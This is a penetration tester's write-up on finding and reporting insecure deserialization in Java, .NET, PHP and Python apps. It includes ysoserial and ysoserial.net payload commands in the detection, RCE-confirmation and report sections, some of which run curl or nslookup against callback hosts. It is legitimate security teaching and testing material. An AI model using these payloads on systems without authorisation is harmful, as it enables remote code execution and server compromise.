# Insecure Deserialization — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** Software and Data Integrity Failures — OWASP A08:2021
>
> **Severity:** High to Critical — frequently leads to Remote Code Execution (RCE) and full server compromise
>
> **Real-world impact:** Insecure deserialization is the most technically complex finding in this series, and also one of the most rewarding when confirmed. In enterprise environments, Java serialization is deeply embedded in legacy application stacks — Java EE, Apache Struts, legacy Spring applications, WebLogic, JBoss. These stacks carry years of accumulated gadget chain exposure. A single confirmed deserialization finding in an enterprise Java application often means full server compromise. This is the vulnerability class that took down major enterprises before patches and tooling caught up with it.

---

## 🧠 Why This Write-Up Exists

Deserialization vulnerabilities are the finding that separates testers who understand application architecture from those who only run surface-level scans. They require understanding how serialization works, recognising the data format on sight, knowing which gadget chains apply to which class libraries, and executing the detection safely without impacting production systems.

I have found deserialization vulnerabilities in enterprise Java applications — particularly in legacy ASP.NET ViewState implementations, Spring-based internal APIs, and older .NET remoting configurations. In each case, the detection used a safe, non-destructive technique (DNS callback via URLDNS or Burp Collaborator) before any RCE attempt. This document reflects that safe, professional approach.

One important note: deserialization exploitation for RCE is an advanced topic. This write-up covers detection, safe confirmation, and professional reporting. Actual RCE exploitation should only be performed within the explicit written scope of a penetration test engagement, never in production without specific authorisation.

---

## 📖 What Is Insecure Deserialization?

Serialization converts a complex object (user session, shopping cart, configuration) into a flat format that can be stored or transmitted — a byte stream, Base64 string, XML, or JSON. Deserialization converts it back into a live object.

The vulnerability occurs when an application deserializes data received from an untrusted source — a cookie, request parameter, API body — without validating its integrity or type. An attacker can craft a malicious serialized payload that, when deserialized by the server, executes arbitrary code through pre-existing classes in the application's classpath.

```
Safe Serialization — trusted data only:
  Server creates object → serializes → sends to client
  Client sends serialized data → server deserializes → uses object
  ✓ Safe only if the data was created and signed server-side

Insecure Deserialization — untrusted input:
  Attacker crafts malicious serialized payload
  → Sends in cookie, request body, or API parameter
  → Server deserializes the payload
  → During deserialization, classes in the classpath execute methods
  → Attacker-controlled code runs on the server → RCE

The attack works through "gadget chains":
  The attacker does not inject new code — they chain together
  existing classes already in the application's classpath
  in a sequence that produces malicious behaviour when instantiated.
  If the target uses Apache Commons Collections (a very common library)
  → CommonsCollections gadget chains are available → RCE
```

---

## 🔍 Phase 1 — Recognition: Finding Serialized Data

The first skill is recognising serialised data formats on sight in Burp Suite HTTP History.

### Java Serialization

```
Indicators in HTTP traffic:

Base64-encoded (most common in cookies and parameters):
  rO0ABXNyAC5vcmcu → starts with rO0 = Java serialized (reliable indicator)
  rO0ABXVyABNbTGph → starts with rO0 = Java serialized

Raw bytes (hex) — seen in binary protocols:
  AC ED 00 05        → Java magic bytes (hex view in Burp)

Where to look:
  Cookie headers:    Cookie: session=rO0ABXNyAC5...
  POST body:         <serializedObject>rO0ABXN...</serializedObject>
  JSON fields:       {"data": "rO0ABXNy..."}
  GET parameters:    ?session=rO0ABXNy...
  Custom headers:    X-Session-Data: rO0ABXNy...
  Remember-me tokens: rememberme=rO0ABXNy...
```

### .NET Serialization (BinaryFormatter / ViewState)

```
__VIEWSTATE parameter in ASP.NET forms:
  <input type="hidden" name="__VIEWSTATE"
         value="/wEPDwULLTEyMzQ1Njc4OWRkZ...">

  → Long Base64 string in hidden form field
  → BinaryFormatter serialization if MAC validation is disabled
  → Vulnerable to ysoserial.net exploitation

Identifying unprotected ViewState:
  In Burp: search POST requests for __VIEWSTATE
  Check for __VIEWSTATEGENERATOR parameter — absence may indicate no MAC
  Test: modify ViewState base64 → send → if no MachineKey error = unprotected

.NET Remoting / WCF:
  SOAP payloads with type annotations:
  <a1:MyClass xmlns:a1="...">  → .NET object serialization in XML
```

### PHP Object Serialization

```
PHP serialized string format — recognisable pattern:
  O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
  │   │      │   │              │
  │   class  fields  key type+len  value
  Object marker

Where found:
  Cookies:    Cookie: user_session=O%3A4%3A%22User%22...  (URL-encoded)
  Hidden fields: <input type="hidden" value="O:4:&quot;User&quot;...">
  API responses: Any value that begins with O: or a: (array)
```

### Python Pickle

```
Python pickle format:
  Starts with: \x80\x04 (Protocol 4) or \x80\x02 (Protocol 2)
  In Base64: gASV... or gAJ... or KAAAA...

Where found:
  Python/Django/Flask session cookies
  API endpoints that accept Python-native data
  Message queues in Python microservices

Critical note:
  Python pickle can execute arbitrary code on load by design
  Never deserialize untrusted pickle data — it is inherently dangerous
  Finding: any endpoint that deserializes pickle from user input = Critical
```

---

## 💥 Phase 2 — Safe Detection Methodology

**The golden rule of deserialization testing in enterprise environments:**
**Confirm before exploiting. Use DNS-only techniques first. Never execute OS commands without explicit written authorisation.**

### Step 1 — Safe Detection with URLDNS Gadget (Java)

The URLDNS gadget chain triggers only a DNS lookup — no file system access, no command execution, no application impact. It is safe to use in production environments for detection purposes.

```
Tool: ysoserial
Download: https://github.com/frohoff/ysoserial/releases

Generate URLDNS payload:
java -jar ysoserial.jar URLDNS "http://UNIQUE-ID.burpcollaborator.net" \
     | base64 -w 0

This creates a Base64-encoded Java serialized payload that,
when deserialized, triggers a DNS lookup to your Collaborator URL.
It does NOT execute OS commands or read files.

Step 1: Start Burp Collaborator
  Burp menu → Burp Collaborator client → Copy to clipboard
  Get URL: xyz123.burpcollaborator.net

Step 2: Generate URLDNS payload targeting your Collaborator URL
  java -jar ysoserial.jar URLDNS "http://java-deser.xyz123.burpcollaborator.net" \
       | base64 -w 0

Step 3: Replace the serialized value in the target request
  In Burp Repeater: replace rO0ABXNy... with your URLDNS payload

Step 4: Send the request

Step 5: Check Burp Collaborator
  If DNS lookup arrives: "java-deser.xyz123.burpcollaborator.net" = confirmed!
  The server deserializes objects from user input
  Deserialization is happening = vulnerability confirmed

Step 6: Document carefully
  Screenshot the Collaborator DNS hit with timestamp
  Note the endpoint, parameter, and request details
  This is your proof of concept — do not escalate to RCE without authorisation
```

### Step 2 — Identifying Available Gadget Chains

Once deserialization is confirmed, identify which libraries are in the classpath.

```
Method 1 — Error-based library detection:
  Generate a payload for a specific gadget chain
  If the server deserializes it and that chain is NOT available:
  The error message reveals which classes ARE available

Method 2 — From application information already gathered:
  Spring Boot /actuator/beans → lists all loaded beans → confirms libraries
  pom.xml or build.gradle if exposed → lists all dependencies
  Stack traces → reveal package names → confirm library presence

Method 3 — Version fingerprinting from other findings:
  If you found verbose errors revealing Apache Commons 3.x
  → CommonsCollections1-3 gadget chains are applicable
  If Spring Framework is identified
  → Spring1 gadget chain applicable

Common gadget chains and their prerequisites:
  CommonsCollections1-7  → Apache Commons Collections 3.x or 4.x
  Spring1, Spring2       → Spring Framework + Spring Core
  Hibernate1             → Hibernate ORM
  JBossInterceptors1     → JBoss Interceptors
  ROME                   → ROME RSS library
  Clojure                → Clojure runtime
  CommonsBeanutils1      → Apache Commons BeanUtils

For .NET applications — ysoserial.net:
  BinaryFormatter        → Most common .NET serializer
  TypeConfuseDelegate    → Common gadget for .NET RCE
  WindowsIdentity        → NTLM credential capture
  ObjectDataProvider     → WPF-based .NET apps
```

### Step 3 — Confirming RCE Safely (with explicit authorisation only)

```
If engagement scope explicitly authorises RCE confirmation:

Method 1 — DNS/HTTP callback (safest, preferred for pentest reports):
  java -jar ysoserial.jar CommonsCollections6 \
    'curl https://rce-confirm.xyz123.burpcollaborator.net' | base64 -w 0

  → Triggers HTTP request to Collaborator = confirms OS command execution
  → Does not modify any files, create any accounts, or impact the system
  → Screenshot Collaborator hit = irrefutable RCE proof for report

Method 2 — Time-based (if outbound connections blocked):
  java -jar ysoserial.jar CommonsCollections6 \
    'ping -c 5 127.0.0.1' | base64 -w 0

  → 5-second response delay confirms command execution
  → Measure response time in Burp — 5+ seconds = RCE confirmed

What NOT to do in enterprise engagements without explicit written authorisation:
  ✗ Do not execute commands that create files or users
  ✗ Do not attempt to access /etc/passwd or sensitive system files
  ✗ Do not attempt to establish reverse shells or persistent access
  ✗ Do not attempt to pivot to internal network
  Document the finding as Critical, demonstrate DNS callback proof, stop.
```

---

## 🏭 Enterprise-Specific Targets

### ASP.NET ViewState — Most Common .NET Deserialization Finding

```
Identification:
  Look for __VIEWSTATE hidden field in any ASP.NET web form
  Also check: __EVENTVALIDATION, __PREVIOUSPAGE

Vulnerability condition:
  If the application does NOT use a MachineKey for MAC validation
  → ViewState can be tampered and deserialised unsafely

Testing:
  Step 1: Find __VIEWSTATE in a form POST request
  Step 2: Try modifying the Base64 value
  Step 3: If the response does NOT contain "Validation of viewstate MAC failed"
           → MAC validation is not enforced → potentially vulnerable

Tool: ysoserial.net
  ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate \
    -c "nslookup viewstate-rce.COLLABORATOR-URL"

  Replace __VIEWSTATE value with Base64-encoded ysoserial.net payload
  → DNS hit confirms deserialization RCE via ViewState
```

### Legacy .NET Remoting / WCF Services

```
Identification:
  Endpoints returning Content-Type: application/soap+xml
  WSDL files: /service.asmx?wsdl  /service.svc?wsdl
  Remote headers: Content-Type: application/x-ms-wmv

.NET Remoting (deprecated but still present in legacy enterprise):
  TCP endpoints: TCP://server:8080/endpoint
  HTTP endpoints: /RemotingService.rem
  BinaryFormatter used by default → vulnerable to ysoserial.net payloads

Testing:
  Capture a .NET Remoting request in Burp
  Replace the binary payload with ysoserial.net TypeConfuseDelegate payload
  Monitor Burp Collaborator for DNS hit
```

---

## 🗂️ Systematic Testing Checklist

```
IDENTIFICATION
☐ Search all Burp HTTP History cookies for: rO0, O:, \x80\x04
☐ Check all hidden form fields for: __VIEWSTATE, rO0, Base64 blobs
☐ Search all POST body parameters for serialized format indicators
☐ Check custom headers: X-Session-Data, X-Cache-Token, X-Auth

JAVA APPLICATIONS
☐ Generate URLDNS payload → replace any rO0... cookie/param → check Collaborator
☐ If confirmed: identify gadget chains from library information
☐ Document with Collaborator DNS screenshot — do not escalate without authorisation

.NET APPLICATIONS
☐ Find __VIEWSTATE in all ASP.NET forms
☐ Test MAC validation: modify value → check for "MAC failed" error
☐ If no MAC validation error: ViewState deserialization is unsafe

PHP APPLICATIONS
☐ Decode any O: cookies → identify the class being instantiated
☐ Check if class has __wakeup() or __destruct() magic methods
☐ Test: modify serialized values (role=admin, privilege escalation)

PYTHON APPLICATIONS
☐ Look for \x80\x04 or \x80\x02 byte sequences in any cookies or parameters
☐ Any Python pickle input from user = Critical finding (no gadget chain needed)

TOOLING CHECK
☐ ysoserial ready: java -jar ysoserial.jar --help
☐ ysoserial.net ready: ysoserial.exe --help
☐ Burp Collaborator client open and polling
☐ All testing logged in Burp for report evidence
```

---

## 📋 Enterprise Pentest Report Template

---

**Finding Title:** Insecure Java Deserialization — Remote Code Execution via Session Cookie

**Severity:** Critical

**CVSS v3.1 Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Affected Endpoint:** All authenticated requests — `Cookie: session=<serialized value>`

**Authentication Required:** No — payload can be sent without a valid session

---

**Vulnerability Description:**

The application uses Java native serialization to store session state in a client-side cookie. The deserialized content is processed without integrity validation or type restrictions. The application's classpath includes Apache Commons Collections, which provides a known gadget chain enabling Remote Code Execution via crafted serialized objects.

An unauthenticated attacker can send a malicious serialized payload in the `session` cookie, which the server deserializes before any authentication check, resulting in arbitrary OS command execution under the application's service account.

---

**Steps to Reproduce:**

1. Open Burp Suite → start Burp Collaborator client → copy URL
2. Generate URLDNS detection payload:
   ```
   java -jar ysoserial.jar URLDNS "http://deser-detect.COLLABORATOR.net" | base64 -w 0
   ```
3. Capture any request to the application in Burp Repeater
4. Replace the `session` cookie value with the generated Base64 payload
5. Send the request
6. In Burp Collaborator → observe DNS lookup for `deser-detect.COLLABORATOR.net`
7. DNS lookup confirmed at [timestamp] → deserialization of untrusted input confirmed

**RCE confirmation (DNS callback method — no system impact):**
```
java -jar ysoserial.jar CommonsCollections6 \
  "nslookup rce-confirmed.COLLABORATOR.net" | base64 -w 0
```
Replace session cookie → send → DNS hit received → OS command execution confirmed.

---

**Proof of Concept:**

```
[Screenshot: Burp Collaborator DNS interaction log]
Interaction type: DNS
From: [server IP]
Payload: deser-detect.xyz123.burpcollaborator.net
Time: [timestamp]

[Screenshot: Burp Collaborator HTTP interaction]
Interaction type: HTTP
From: [server IP]
Path: /rce-confirmed (from curl command in CommonsCollections6 payload)
Time: [timestamp + ~200ms after request]
```

---

**Business Impact:**

- Unauthenticated Remote Code Execution on the production application server
- Service account access to the operating system, filesystem, and internal network
- Potential for database credential extraction, internal network pivoting, and persistent backdoor installation
- No authentication required — the vulnerability is triggered before session validation

---

**Remediation:**

| Priority | Action |
|---|---|
| Immediate | Move session storage to server-side (database or Redis) — never serialize session to client |
| Immediate | If serialization to client is required, implement HMAC signing with a strong secret key |
| Short-term | Implement Java deserialization filter (ObjectInputFilter) to allowlist expected classes only |
| Short-term | Update Commons Collections to latest version and audit classpath for known gadget chain libraries |
| Long-term | Replace Java native serialization with JSON or XML for all inter-service communication |
| Long-term | Add Contrast Security or similar RASP agent to detect deserialization attacks at runtime |

---

**Secure Implementation Pattern (Java):**

```java
// ❌ VULNERABLE — deserializing untrusted cookie value
String sessionCookie = request.getCookies()["session"].getValue();
byte[] decoded = Base64.decode(sessionCookie);
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded));
SessionObject session = (SessionObject) ois.readObject();  // ← RCE possible here

// ✅ SECURE — server-side session with signed token
// Store session in Redis/database server-side
// Give client only an opaque signed token:
String sessionId = UUID.randomUUID().toString();
String hmac = computeHMAC(sessionId, SECRET_KEY);   // HMAC-SHA256
String token = sessionId + "." + hmac;
response.addCookie(new Cookie("session", token));   // client gets token only

// On each request — verify token, look up session server-side:
String[] parts = sessionCookie.split("\\.");
if (!verifyHMAC(parts[0], parts[1], SECRET_KEY))
    throw new SecurityException("Invalid session token");
SessionObject session = redis.get(parts[0]);        // server-side lookup

// ✅ SECURE — Java deserialization filter (if serialization is unavoidable):
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(info -> {
    // Allowlist only expected classes
    if (info.serialClass() != null) {
        String name = info.serialClass().getName();
        if (!ALLOWED_CLASSES.contains(name)) {
            return ObjectInputFilter.Status.REJECTED;
        }
    }
    return ObjectInputFilter.Status.ALLOWED;
});
```

---

## 🧪 Practice Labs

| Platform | Resource | Focus Area |
|---|---|---|
| [PortSwigger Deserialization Labs](https://portswigger.net/web-security/deserialization) | 10 free labs | Java, PHP, Ruby deserialization |
| [HackTheBox](https://hackthebox.com) | Java deserialization machines | Real Java app stacks |
| [TryHackMe](https://tryhackme.com) | Deserialization rooms | Concept to exploitation |
| [InsecureLabs](https://github.com/insecure-deserialization/labs) | Local lab setup | All language types |

---

## 🧭 Key Takeaways From 5+ Years of Enterprise Testing

**1. Recognising the data format is the entire first step.**
Deserialization testing starts with one question: does any user-controlled input contain serialized data? If you can answer that question confidently across every request in the application — by knowing what rO0, O:, __VIEWSTATE, and \x80\x04 look like — you have the hardest skill required. Everything else follows a methodology.

**2. Use DNS-only detection. Always. Even in test environments.**
The URLDNS gadget chain is safe, produces definitive proof, and has zero application impact. There is no reason to use a command-execution gadget chain in the initial detection phase. In enterprise engagements, producing a Burp Collaborator screenshot showing a DNS hit from the server is sufficient proof of deserialization. Report it as Critical with the DNS evidence and leave RCE confirmation to the explicit authorisation discussion with the client.

**3. Deserialization is often pre-authentication — that changes everything.**
Most vulnerabilities require the attacker to be authenticated. Many deserialization vulnerabilities fire before authentication checks — the session cookie is deserialized to extract the user object before the user is authenticated. This means unauthenticated RCE, which escalates the CVSS score and the urgency of remediation significantly. Always test deserialization payloads in unauthenticated requests.

**4. The enterprise Java classpath is the attacker's toolkit.**
The attacker does not need to upload any code to exploit deserialization. They use what is already in the JVM classpath — Apache Commons, Spring, Hibernate. Any enterprise Java application running for more than a few years will have multiple gadget chain candidates in its classpath. This is why old Java enterprise stacks remain the most reliable deserialization target.

**5. The remediation is architectural, not a patch.**
Deserialization vulnerabilities cannot be fixed with input sanitisation or a WAF rule — they are inherent to deserializing untrusted input regardless of the data content. The only real fix is architectural: move session state server-side, or implement a cryptographically signed integrity check that prevents any modification of serialized data before deserialization. Communicate this clearly in the report — a firewall rule in front of the endpoint is not a fix.

---

## 🔗 References

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PortSwigger Deserialization Research](https://portswigger.net/web-security/deserialization)
- [ysoserial — Java Gadget Chains](https://github.com/frohoff/ysoserial)
- [ysoserial.net — .NET Gadget Chains](https://github.com/pwntester/ysoserial.net)
- [PHPGGC — PHP Gadget Chains](https://github.com/ambionics/phpggc)
- [Java Deserialization Scanner — Burp Extension](https://github.com/federicodotta/Java-Deserialization-Scanner)

---

<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
